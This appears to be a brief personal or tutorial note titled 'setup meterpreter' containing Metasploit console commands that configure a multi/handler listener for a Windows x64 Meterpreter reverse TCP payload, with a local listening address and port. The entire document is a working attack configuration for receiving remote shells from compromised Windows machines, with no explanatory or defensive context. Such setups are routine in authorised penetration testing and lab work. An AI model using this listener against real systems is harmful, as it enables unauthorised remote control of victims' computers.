# setup meterpreter
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.23
set LPORT 5555
```